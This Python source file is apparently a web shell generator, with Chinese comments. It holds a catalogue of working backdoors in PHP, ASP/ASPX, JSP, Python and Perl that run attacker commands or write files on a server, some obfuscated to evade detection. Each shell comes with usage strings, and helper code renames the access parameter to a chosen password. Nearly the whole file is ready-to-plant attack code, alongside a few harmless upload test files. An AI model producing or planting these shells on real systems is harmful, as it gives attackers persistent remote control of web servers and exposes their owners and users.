#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebShell生成器 - 生成各种语言的webshell
"""

import base64
import random
import string
import textwrap
import re


class WebShellGenerator:
    """WebShell生成器类"""
    
    def __init__(self):
        self.password = self._generate_password()
        
    def _generate_password(self, length=8):
        """生成随机密码"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def get_php_shells(self):
        """获取PHP webshell集合"""
        return {
            "simple_eval": {
                "name": "简单Eval Shell",
                "code": "<?php eval($_REQUEST['cmd']); ?>",
                "usage": "?cmd=system('whoami');"
            },
            "post_eval": {
                "name": "POST Eval Shell",
                "code": "<?php @eval($_POST['{password}']); ?>",
                "usage": f"POST: {self.password}=system('whoami');"
            },
            "get_shell": {
                "name": "GET参数Shell",
                "code": "<?php system($_GET['cmd']); ?>",
                "usage": "?cmd=whoami"
            },
            "assert_shell": {
                "name": "Assert Shell",
                "code": "<?php assert($_REQUEST['cmd']); ?>",
                "usage": "?cmd=system('whoami');"
            },
            "preg_shell": {
                "name": "Preg Replace Shell",
                "code": "<?php preg_replace('/.*/e', $_REQUEST['cmd'], ''); ?>",
                "usage": "?cmd=system('whoami');"
            },
            "create_function": {
                "name": "Create Function Shell",
                "code": "<?php $f = create_function('', $_REQUEST['cmd']); $f(); ?>",
                "usage": "?cmd=system('whoami');"
            },
            "base64_shell": {
                "name": "Base64编码Shell",
                "code": "<?php eval(base64_decode($_REQUEST['cmd'])); ?>",
                "usage": "?cmd=base64_encode('system(\"whoami\");')"
            },
            "file_put_shell": {
                "name": "File Put Contents Shell",
                "code": textwrap.dedent("""\
                <?php 
                $file = $_REQUEST['f']; 
                $content = $_REQUEST['c']; 
                file_put_contents($file, base64_decode($content)); 
                echo 'OK';
                ?>"""),
                "usage": "?f=shell.php&c=base64_content"
            },
            "mini_shell": {
                "name": "极简Shell",
                "code": "<?=`$_GET[1]`;?>",
                "usage": "?1=whoami"
            },
            "one_liner": {
                "name": "一句话木马",
                "code": "<?php @eval($_POST['x']);?>",
                "usage": "POST: x=phpinfo();"
            },
            "advanced_shell": {
                "name": "高级WebShell",
                "code": textwrap.dedent("""\
                <?php
                if(isset($_REQUEST['cmd'])){
                    $cmd = ($_REQUEST['cmd']);
                    system($cmd);
                    echo "</pre>";
                    die;
                }
                if(isset($_REQUEST['upload'])){
                    $file = $_FILES['file']['tmp_name'];
                    $name = $_FILES['file']['name'];
                    move_uploaded_file($file, $name);
                    echo "Uploaded: $name";
                }
                ?>"""),
                "usage": "?cmd=whoami 或 ?upload=1 (POST file)"
            },
            "bypass_shell": {
                "name": "混淆Shell",
                "code": "<?php $a='as'.'se'.'rt'; $a($_POST['x']); ?>",
                "usage": "POST: x=phpinfo();"
            },
            "iconv_shell": {
                "name": "Iconv Bypass Shell",
                "code": "<?php iconv('UCS-2LE', 'UTF-8', $_POST['x']); ?>",
                "usage": "POST: x=encoded_command"
            }
        }
    
    def get_asp_shells(self):
        """获取ASP webshell集合"""
        return {
            "simple_asp": {
                "name": "简单ASP Shell",
                "code": "<%eval request(\"cmd\")%>",
                "usage": "POST: cmd=execute command"
            },
            "execute_asp": {
                "name": "Execute Shell",
                "code": textwrap.dedent("""\
                <%
                Dim cmd
                cmd = Request.QueryString("cmd")
                If cmd <> "" Then
                    Dim wsh
                    Set wsh = Server.CreateObject("WScript.Shell")
                    Dim exec
                    Set exec = wsh.Exec(cmd)
                    Response.Write(exec.StdOut.ReadAll)
                End If
                %>"""),
                "usage": "?cmd=whoami"
            },
            "aspx_shell": {
                "name": "ASPX Shell",
                "code": textwrap.dedent("""\
                <%@ Page Language="C#" %>
                <%@ Import Namespace="System.Diagnostics" %>
                <%
                string cmd = Request.QueryString["cmd"];
                if (!string.IsNullOrEmpty(cmd))
                {
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + cmd;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.UseShellExecute = false;
                    p.Start();
                    Response.Write(p.StandardOutput.ReadToEnd());
                }
                %>"""),
                "usage": "?cmd=whoami"
            },
            "cmd_asp": {
                "name": "CMD执行Shell",
                "code": textwrap.dedent("""\
                <%
                Set shell = CreateObject("WScript.Shell")
                Set cmd = shell.Exec(Request("cmd"))
                Response.Write cmd.StdOut.ReadAll()
                %>"""),
                "usage": "POST: cmd=whoami"
            }
        }
    
    def get_jsp_shells(self):
        """获取JSP webshell集合"""
        return {
            "simple_jsp": {
                "name": "简单JSP Shell",
                "code": textwrap.dedent("""\
                <%@ page import="java.io.*" %>
                <%
                String cmd = request.getParameter("cmd");
                if (cmd != null) {
                    Process p = Runtime.getRuntime().exec(cmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        out.println(line);
                    }
                }
                %>"""),
                "usage": "?cmd=whoami"
            },
            "process_builder": {
                "name": "Process Builder Shell",
                "code": textwrap.dedent("""\
                <%@ page import="java.io.*,java.util.*" %>
                <%
                String[] cmds = request.getParameterValues("cmd");
                if (cmds != null) {
                    List<String> cmdList = Arrays.asList(cmds);
                    ProcessBuilder pb = new ProcessBuilder(cmdList);
                    Process process = pb.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        out.println(line + "<br>");
                    }
                }
                %>"""),
                "usage": "?cmd=/bin/sh&cmd=-c&cmd=whoami"
            },
            "advanced_jsp": {
                "name": "高级JSP Shell",
                "code": textwrap.dedent("""\
                <%@ page import="java.io.*,java.net.*" %>
                <%
                String cmd = request.getParameter("cmd");
                if (cmd != null) {
                    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                    InputStream in = p.getInputStream();
                    int c;
                    while ((c = in.read()) != -1) {
                        out.print((char)c);
                    }
                    in.close();
                }
                String upload = request.getParameter("upload");
                if (upload != null) {
                    String file = request.getParameter("file");
                    String content = request.getParameter("content");
                    FileWriter fw = new FileWriter(file);
                    fw.write(content);
                    fw.close();
                    out.println("File written: " + file);
                }
                %>"""),
                "usage": "?cmd=whoami 或 ?upload=1&file=test.txt&content=test"
            }
        }
    
    def get_python_shells(self):
        """获取Python webshell集合"""
        return {
            "cgi_shell": {
                "name": "CGI Shell",
                "code": textwrap.dedent("""\
                #!/usr/bin/env python3
                import os
                import cgi
                import subprocess
                
                print("Content-Type: text/plain\\n")
                
                form = cgi.FieldStorage()
                cmd = form.getvalue('cmd', '')
                
                if cmd:
                    try:
                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        print(result.decode('utf-8'))
                    except Exception as e:
                        print(str(e))
                """),
                "usage": "?cmd=whoami"
            },
            "flask_shell": {
                "name": "Flask Shell",
                "code": textwrap.dedent("""\
                from flask import Flask, request
                import subprocess
                
                app = Flask(__name__)
                
                @app.route('/shell')
                def shell():
                    cmd = request.args.get('cmd')
                    if cmd:
                        return subprocess.check_output(cmd, shell=True)
                    return 'No command'
                
                if __name__ == '__main__':
                    app.run()
                """),
                "usage": "/shell?cmd=whoami"
            }
        }
    
    def get_perl_shells(self):
        """获取Perl webshell集合"""
        return {
            "cgi_perl": {
                "name": "CGI Perl Shell",
                "code": textwrap.dedent("""\
                #!/usr/bin/perl
                use CGI;
                my $q = CGI->new;
                my $cmd = $q->param('cmd');
                print "Content-type: text/plain\\n\\n";
                if ($cmd) {
                    print `$cmd`;
                }
                """),
                "usage": "?cmd=whoami"
            }
        }
    
    def get_all_shells(self):
        """获取所有webshell"""
        return {
            "php": self.get_php_shells(),
            "asp": self.get_asp_shells(),
            "jsp": self.get_jsp_shells(),
            "python": self.get_python_shells(),
            "perl": self.get_perl_shells()
        }
    
    def generate_shell(self, language, shell_type, custom_password=None):
        """生成特定类型的webshell"""
        shells = self.get_all_shells()
        
        if language not in shells:
            return None
        
        if shell_type not in shells[language]:
            return None
        
        shell = shells[language][shell_type].copy()
        password = custom_password or self.password
        code_before = str(shell.get("code", ""))
        usage_before = str(shell.get("usage", ""))
        uses_password = "{password}" in code_before or "{password}" in usage_before
        # 代码和用法说明都必须使用同一个最终密码。旧版 PHP
        # get_php_shells() 的 usage 已经插入了默认随机密码，不能只替换代码占位符。
        shell["code"] = shell["code"].replace("{password}", password)
        usage = shell.get("usage")
        if isinstance(usage, str):
            usage = usage.replace("{password}", password)
            if self.password and self.password in usage:
                usage = usage.replace(self.password, password)
            shell["usage"] = usage
        if custom_password:
            # 将所有常见的命令参数名统一替换为用户指定的访问参数名。
            # 仅匹配请求参数访问语法，不做全局字符串替换，避免误改代码内容。
            parameter_names = ("cmd", "command", "x")
            for name in parameter_names:
                shell["code"] = re.sub(
                    rf"((?:_REQUEST|_GET|_POST)\s*\[\s*['\"]){re.escape(name)}(['\"]\s*\])",
                    rf"\g<1>{password}\g<2>", shell["code"]
                )
                shell["code"] = re.sub(
                    rf"((?:Request|request)\s*\.?\s*(?:QueryString|Form|Params?)\s*\(\s*['\"]){re.escape(name)}(['\"]\s*\))",
                    rf"\g<1>{password}\g<2>", shell["code"]
                )
            if isinstance(shell.get("usage"), str):
                for name in parameter_names:
                    shell["usage"] = re.sub(rf"([?&]|POST:\s*){re.escape(name)}(?==|\s*=)", rf"\g<1>{password}", shell["usage"])
                shell["code"] = re.sub(r"(\$_(?:GET|POST|REQUEST)\s*\[\s*)1(\s*\])", rf"\g<1>{password}\g<2>", shell["code"])
                shell["usage"] = re.sub(r"([?&]|POST:\s*)1(?==|\s*=)", rf"\g<1>{password}", shell["usage"])
                # 数字下标形式必须保持 PHP 字符串键语法。
                shell["code"] = re.sub(
                    rf"(\$_(?:GET|POST|REQUEST)\s*\[\s*){re.escape(password)}(\s*\])",
                    rf"\g<1>'{password}'\g<2>", shell["code"]
                )
            if shell["code"] != code_before or shell.get("usage", usage_before) != usage_before:
                uses_password = True
        # 不带密码占位符的 Shell（如 simple_eval）不应伪装成已使用自定义密码。
        shell["password"] = password if uses_password else None
        
        return shell
    
    def get_test_files(self):
        """获取无害测试文件"""
        return {
            "eicar": {
                "name": "EICAR测试文件",
                "content": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
                "description": "标准杀毒软件测试文件，无害但会被大多数杀毒软件检测"
            },
            "html_test": {
                "name": "HTML测试文件",
                "content": "<html><body><h1>Test Upload</h1></body></html>",
                "description": "简单的HTML测试文件"
            },
            "txt_test": {
                "name": "文本测试文件",
                "content": "This is a test file for upload testing.",
                "description": "简单的文本测试文件"
            }
        }
